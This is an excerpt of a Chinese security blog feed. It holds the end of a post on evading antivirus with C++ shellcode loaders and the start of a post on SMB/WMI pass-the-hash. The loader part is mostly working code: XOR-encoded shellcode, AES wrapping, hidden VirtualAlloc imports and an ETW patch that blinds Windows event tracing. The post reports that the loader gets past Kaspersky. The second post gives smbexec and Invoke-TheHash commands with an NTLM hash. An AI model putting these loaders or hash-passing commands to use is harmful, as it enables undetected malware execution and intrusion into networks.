class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Shift_encryption</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">char</span> plain[], <span class="keyword">char</span> ciphertext[])</span>  <span class="comment">//移位加密</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; plain[i] != <span class="string">'\0'</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (plain[i] &gt; <span class="number">64</span> &amp;&amp; plain[i] &lt; <span class="number">91</span>)<span class="comment">//确定是字母</span></span><br><span class="line">        &#123;</span><br><span class="line">            ciphertext[i] = plain[i] + k;</span><br><span class="line">            <span class="keyword">if</span> (ciphertext[i] &gt; <span class="number">90</span>) <span class="comment">//保证密文是字母，且大小写不发生改变</span></span><br><span class="line">                ciphertext[i] = ciphertext[i] - <span class="number">26</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (plain[i] &gt; <span class="number">96</span> &amp;&amp; plain[i] &lt; <span class="number">123</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ciphertext[i] = plain[i] + k;</span><br><span class="line">            <span class="keyword">if</span> (ciphertext[i] &gt; <span class="number">122</span>)</span><br><span class="line">                ciphertext[i] = ciphertext[i] - <span class="number">26</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Shift_decryption</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">char</span> plain[], <span class="keyword">char</span> ciphertext[])</span>  <span class="comment">//移位加密</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; ciphertext[i] != <span class="string">'\0'</span>; i++)<span class="comment">//确定是字母</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ciphertext[i] &gt; <span class="number">64</span> &amp;&amp; ciphertext[i] &lt; <span class="number">91</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            plain[i] = ciphertext[i] - k;</span><br><span class="line">            <span class="keyword">if</span> (plain[i] &lt; <span class="number">65</span>)<span class="comment">//保证密文是字母，且大小写不发生改变</span></span><br><span class="line">                plain[i] = plain[i] + <span class="number">26</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ciphertext[i] &gt; <span class="number">96</span> &amp;&amp; ciphertext[i] &lt; <span class="number">123</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            plain[i] = ciphertext[i] - k;</span><br><span class="line">            <span class="keyword">if</span> (plain[i] &lt; <span class="number">97</span>)<span class="comment">//保证密文是字母，且大小写不发生改变</span></span><br><span class="line">                plain[i] = plain[i] + <span class="number">26</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> password = <span class="number">1025</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> enShellCode[<span class="number">6000</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> deShellCode[<span class="number">6000</span>];</span><br><span class="line">    <span class="keyword">int</span> nLen = <span class="keyword">sizeof</span>(buf) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nLen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        enShellCode[i] = buf[i] ^ password;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\\x%x"</span>, enShellCode[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nLen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        deShellCode[i] = enShellCode[i] ^ password;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\\x%x"</span>, deShellCode[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="时间戳"><a href="#时间戳" class="headerlink" title="时间戳"></a>时间戳</h3><p> 获取时间戳来进行aes加密，利用外部库boost获取时间戳。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int64_t GetCurrentStamp64()</span><br><span class="line">&#123;</span><br><span class="line">    /<span class="regexp">/获取当前时间戳(秒or毫秒)</span></span><br><span class="line"><span class="regexp">    boost::posix_time::ptime epoch(boost::gregorian::date(1970, boost::gregorian::Jan, 1));</span></span><br><span class="line"><span class="regexp">    boost::posix_time::time_duration time_from_epoch = boost::posix_time::second_clock::universal_time() - epoch;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    return time_from_epoch.total_seconds();</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="AES加密"><a href="#AES加密" class="headerlink" title="AES加密"></a>AES加密</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">enAES</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 使用ECB模式加密</span></span><br><span class="line">        ECB_Mode&lt; AES &gt;::Encryption e;</span><br><span class="line">        e.SetKey(key, <span class="keyword">sizeof</span>(key));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在此处加密</span></span><br><span class="line">        <span class="comment">// StreamTransformationFilter根据需要添加填充，使用PKCS_padding（PKCS7Padding）默认值。</span></span><br><span class="line">        <span class="comment">// ECB和CBC模式必须填充到密码的块大小。</span></span><br><span class="line">        StringSource(strPlain, <span class="literal">true</span>,</span><br><span class="line">            <span class="keyword">new</span> StreamTransformationFilter(e,</span><br><span class="line">                <span class="keyword">new</span> StringSink(strCipher) <span class="comment">// 字符串接收器</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (<span class="keyword">const</span> Exception&amp; e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cerr</span> &lt;&lt; e.what() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    strEncoded.<span class="built_in">clear</span>();</span><br><span class="line">    StringSource(strCipher, <span class="literal">true</span>,</span><br><span class="line">        <span class="keyword">new</span> HexEncoder(</span><br><span class="line">            <span class="keyword">new</span> StringSink(strEncoded)</span><br><span class="line">        ) <span class="comment">//</span></span><br><span class="line">    ); <span class="comment">// StringSource</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">deAES</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// decrypt with ECB mode</span></span><br><span class="line">        ECB_Mode&lt; AES &gt;::Decryption d;</span><br><span class="line">        d.SetKey(key, <span class="keyword">sizeof</span>(key));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// The StreamTransformationFilter removes padding as required.</span></span><br><span class="line">        <span class="function">StringSource <span class="title">s</span><span class="params">(strCipher, <span class="literal">true</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">new</span> StreamTransformationFilter(d,</span></span></span><br><span class="line"><span class="function"><span class="params">                <span class="keyword">new</span> StringSink(strRecovered) <span class="comment">// StringSink</span></span></span></span><br><span class="line"><span class="function"><span class="params">            ) <span class="comment">// StreamTransformationFilter</span></span></span></span><br><span class="line"><span class="function"><span class="params">        )</span></span>; <span class="comment">// StringSource</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (<span class="keyword">const</span> Exception&amp; e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cerr</span> &lt;&lt; e.what() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h2><h3 id="导入表混淆"><a href="#导入表混淆" class="headerlink" title="导入表混淆"></a>导入表混淆</h3><h2 id="修改参数为函数名"><a href="#修改参数为函数名" class="headerlink" title="修改参数为函数名"></a>修改参数为函数名</h2><p>原理：对C++程序的导入表进行混淆。不做任何混淆时的导入表存在例如VirtualAlloc这样的敏感函数，通过隐藏函数的方式来减少马子特征。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> VOID *(WINAPI* pVirtualAlloc)(LPVOID lpAddress, SIZE_T  dwSize, DWORD flAllocationType, DWORD flProtect);</span><br><span class="line">pVirtualAlloc fnVirtualProtect;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> sVirtualProtect[] = &#123; <span class="string">'V'</span>,<span class="string">'i'</span>,<span class="string">'r'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'a'</span>,<span class="string">'l'</span>,<span class="string">'A'</span>,<span class="string">'l'</span>,<span class="string">'l'</span>,<span class="string">'o'</span>,<span class="string">'c'</span>, <span class="number">0x0</span> &#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> sKernel32[] = &#123; <span class="string">'k'</span>,<span class="string">'e'</span>,<span class="string">'r'</span>,<span class="string">'n'</span>,<span class="string">'e'</span>,<span class="string">'l'</span>,<span class="string">'3'</span>,<span class="string">'2'</span>,<span class="string">'.'</span>,<span class="string">'d'</span>,<span class="string">'l'</span>,<span class="string">'l'</span>, <span class="number">0x0</span> &#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">fnVirtualProtect = (pVirtualAlloc)GetProcAddress(GetModuleHandle((LPCSTR)sKernel32), (LPCSTR)sVirtualProtect);</span><br><span class="line"><span class="keyword">void</span>* exec = fnVirtualProtect(<span class="number">0</span>, <span class="keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(exec, deShellCode, <span class="keyword">sizeof</span> deShellCode);</span><br><span class="line">((<span class="keyword">void</span>(*)())exec)();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="禁用Windows事件跟踪-ETW"><a href="#禁用Windows事件跟踪-ETW" class="headerlink" title="禁用Windows事件跟踪 (ETW)"></a>禁用Windows事件跟踪 (ETW)</h2><p>原理：Windows 事件跟踪 (ETW) 是一种有效的内核级跟踪工具，允许你将内核或应用程序定义的事件记录到日志文件中。 可以实时或从日志文件使用事件，并使用它们调试应用程序或确定应用程序中发生性能问题的位置。</p><p>ETW 允许动态启用或禁用事件跟踪，使你可以在生产环境中执行详细的跟踪，而无需重启计算机或应用程序。</p><p>结合混淆导入表代码如下：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">void</span>* (*tNtVirtual) (HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T  NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);</span><br><span class="line">tNtVirtual oNtVirtual;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">disableETW</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// return 0</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> patch[] = &#123; <span class="number">0x48</span>, <span class="number">0x33</span>, <span class="number">0xc0</span>, <span class="number">0xc3</span> &#125;;     <span class="comment">// xor rax, rax; ret</span></span><br><span class="line"></span><br><span class="line">    ULONG oldprotect = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> <span class="built_in">size</span> = <span class="keyword">sizeof</span>(patch);</span><br><span class="line"></span><br><span class="line">    HANDLE hCurrentProc = GetCurrentProcess();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> sEtwEventWrite[] = &#123; <span class="string">'E'</span>,<span class="string">'t'</span>,<span class="string">'w'</span>,<span class="string">'E'</span>,<span class="string">'v'</span>,<span class="string">'e'</span>,<span class="string">'n'</span>,<span class="string">'t'</span>,<span class="string">'W'</span>,<span class="string">'r'</span>,<span class="string">'i'</span>,<span class="string">'t'</span>,<span class="string">'e'</span>, <span class="number">0x0</span> &#125;;</span><br><span class="line">    <span class="keyword">void</span>* pEventWrite = GetProcAddress(GetModuleHandle(<span class="string">"ntdll.dll"</span>), (LPCSTR)sEtwEventWrite);</span><br><span class="line">    <span class="keyword">if</span> ((DWORD)GetModuleHandle(<span class="string">"ntdll.dll"</span>) == <span class="literal">NULL</span>) &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"error"</span>; &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"NTDLL.DLL START ADDRESS: %08x"</span>, (DWORD)GetModuleHandle(<span class="string">"ntdll.dll"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((DWORD)GetProcAddress(GetModuleHandle(<span class="string">"ntdll.dll"</span>), <span class="string">"NtProtectVirtualMemory"</span>) == <span class="literal">NULL</span>) &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"error"</span>; &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="built_in">printf</span>(<span class="string">"\nNtProtectVirtualMemory ADDRESS: %08x"</span>, (DWORD)GetProcAddress(GetModuleHandle(<span class="string">"ntdll.dll"</span>), <span class="string">"NtProtectVirtualMemory"</span>)); &#125;</span><br><span class="line"></span><br><span class="line">    FARPROC farProc = GetProcAddress(GetModuleHandle(<span class="string">"ntdll.dll"</span>), <span class="string">"NtProtectVirtualMemory"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    oNtVirtual = (tNtVirtual)farProc;</span><br><span class="line">    oNtVirtual(hCurrentProc, &amp;pEventWrite, (PSIZE_T)&amp;<span class="built_in">size</span>, PAGE_READWRITE, &amp;oldprotect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//memcpy(pEventWrite, patch, size / sizeof(patch[0]));</span></span><br><span class="line">    <span class="built_in">memcpy</span>(pEventWrite, patch, <span class="number">4</span>);</span><br><span class="line">    oNtVirtual(hCurrentProc, &amp;pEventWrite, (PSIZE_T)&amp;<span class="built_in">size</span>, oldprotect, &amp;oldprotect);</span><br><span class="line">    FlushInstructionCache(hCurrentProc, pEventWrite, <span class="built_in">size</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  disableETW();</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* exec = VirtualAlloc(<span class="number">0</span>, <span class="keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(exec, shellcode, <span class="keyword">sizeof</span> shellcode);</span><br><span class="line">((<span class="keyword">void</span>(*)())exec)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="杀软测试"><a href="#杀软测试" class="headerlink" title="杀软测试"></a>杀软测试</h2><p>最后马子实测配合其他C2可以过卡巴，但是如果用cs的话国产杀软能过，卡巴过不去，卡巴查杀原因是数据库查杀，CS特征被检测到，得从cs特征上修改。</p><img src="/2022/09/22/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/1.png" class=""><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/11448?page=1#toc-11" target="_blank" rel="noopener">红队队开发基础-基础免杀(一)</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;好久没水文章了，最近一段时间一直在忙项目上的事情。&amp;#x3D; &amp;#x3D;&lt;/p&gt;</summary>
    
    
    
    <category term="免杀" scheme="https://chenzidu.github.io/categories/%E5%85%8D%E6%9D%80/"/>
    
    
    <category term="C++" scheme="https://chenzidu.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>SMB_RDP_WMI_hash传递探测_利用</title>
    <link href="https://chenzidu.github.io/2022/06/02/SMB-RDP-WMI-hash%E4%BC%A0%E9%80%92%E6%8E%A2%E6%B5%8B-%E5%88%A9%E7%94%A8/"/>
    <id>https://chenzidu.github.io/2022/06/02/SMB-RDP-WMI-hash%E4%BC%A0%E9%80%92%E6%8E%A2%E6%B5%8B-%E5%88%A9%E7%94%A8/</id>
    <published>2022-06-02T01:41:34.000Z</published>
    <updated>2022-12-11T09:31:21.954Z</updated>
    
    <content type="html"><![CDATA[<h2 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>&emsp;&emsp;SMB服务大多运行在windows系统上，SMB通信协议协议在网络上的端点之间提供对文件、打印机和串行端口的共享访问。在扫描过程中，我们通常会看到目标上的 445 TCP 端口打开，为 SMB 协议保留。Microsoft SMB 协议是传输层协议最常使用的是基于 TCP&#x2F;IP (NBT) 的 NetBIOS，正因为如此，它依赖于较低级别的传输协议。这就是为什么在扫描过程中，我们很可能会同时看到具有在目标上运行的开放端口的协议。<br><br>&emsp;&emsp;使用 SMB 协议，应用程序（或应用程序的用户）可以访问远程服务器上的文件，以及打印机等其他资源。 因此，客户端应用程序可以读取、创建和更新文件远程服务器。 它还可以与任何设置为接收 SMB 客户端的服务器程序通信要求。<br><br>&emsp;&emsp;网络上启用 SMB 的存储称为共享。 任何拥有服务器的地址和正确的凭据。 与许多其他文件访问协议一样，SMB 需要一些安全层在网络拓扑中正常运行。 如果 SMB 允许客户端创建、编辑、<br>检索和删除共享上的文件，显然需要一种身份验证机制。 在用户层面，SMB 客户端需要提供用户名&#x2F;密码组合才能查看内容或与内容交互SMB共享。<br><br>&emsp;&emsp;如果扫描得到目标IP的TCP445开放，为了成功枚举远程系统上的共享内容，我们可以使用一个名为smb客户端。</p><a id="more"></a><h3 id="单IP"><a href="#单IP" class="headerlink" title="单IP"></a>单IP</h3><h4 id="smbexec-hash传递"><a href="#smbexec-hash传递" class="headerlink" title="smbexec_hash传递"></a>smbexec_hash传递</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\smbexec.exe -hashes :<span class="number">973f</span>cd01b987e913cc0209c2f462a751 ./<span class="symbol">administrator@</span><span class="number">192.168</span><span class="number">.1</span><span class="number">.8</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654062783250-d35fada8-94fe-4ec2-8004-665f809dc04f.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=692&id=u09f28a6a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1038&originWidth=1724&originalType=binary&ratio=1&rotation=0&showTitle=false&size=128014&status=done&style=none&taskId=udffff2c3-7bde-47c4-a27f-e473f937928&title=&width=1149.3333333333333" alt="image.png"></p><h4 id="SMBExec-hash探测"><a href="#SMBExec-hash探测" class="headerlink" title="SMBExec_hash探测"></a>SMBExec_hash探测</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-SMBExec -Target <span class="number">192.168</span><span class="number">.1</span><span class="number">.8</span> -Domain DESKTOP-QD1A1VJ -Username administrator -Hash <span class="number">973f</span>cd01b987e913cc0209c2f462a751</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066837915-33437c7d-ef61-4e52-97f3-ae823c4cbbd5.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=55&id=ua98328a9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=82&originWidth=1618&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24562&status=done&style=none&taskId=uc35fe1c4-3465-4def-88eb-7f95b16d7c6&title=&width=1078.6666666666667" alt="image.png"></p><h3 id="网段"><a href="#网段" class="headerlink" title="网段"></a>网段</h3><h4 id="fscan-SMB探测"><a href="#fscan-SMB探测" class="headerlink" title="fscan_SMB探测"></a>fscan_SMB探测</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\fs.exe -h 192.168.1.0/24 -m<span class="built_in"> smb </span>-pwd asd123=</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066674718-5375ef86-6171-41e6-adca-2f78f3fca855.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=454&id=ua6ea3a2d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=681&originWidth=1101&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76007&status=done&style=none&taskId=u6135a004-50ae-43aa-a3b5-7564d19f4cc&title=&width=734" alt="image.png"></p><h4 id="Ps1-hash传递"><a href="#Ps1-hash传递" class="headerlink" title="Ps1_hash传递"></a>Ps1_hash传递</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-TheHash -Type WMIExec -Target <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span>/<span class="number">24</span> -Domain DESKTOP-QD1A1VJ -Username administrator -Hash <span class="number">973f</span>cd01b987e913cc0209c2f462a751</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066475361-5ddea932-19ca-4944-a7d6-8dc0cb3bf9e5.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=63&id=ub3b799d5&margin=%5Bobject%20Object%5D&name=image.png&originHeight=94&originWidth=1601&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30162&status=done&style=none&taskId=uc4b7af49-776d-4240-9744-f1710c5e47f&title=&width=1067.3333333333333" alt="image.png"></p><h2 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>&emsp;&emsp;远程桌面协议(RDP)是一个多通道(multi-channel)的协议，让使用者(所在计算机称为用户端或’本地计算机’)连上提供微软终端机服务的计算机(称为服务端或’远程计算机’)。</p><h3 id="单IP-1"><a href="#单IP-1" class="headerlink" 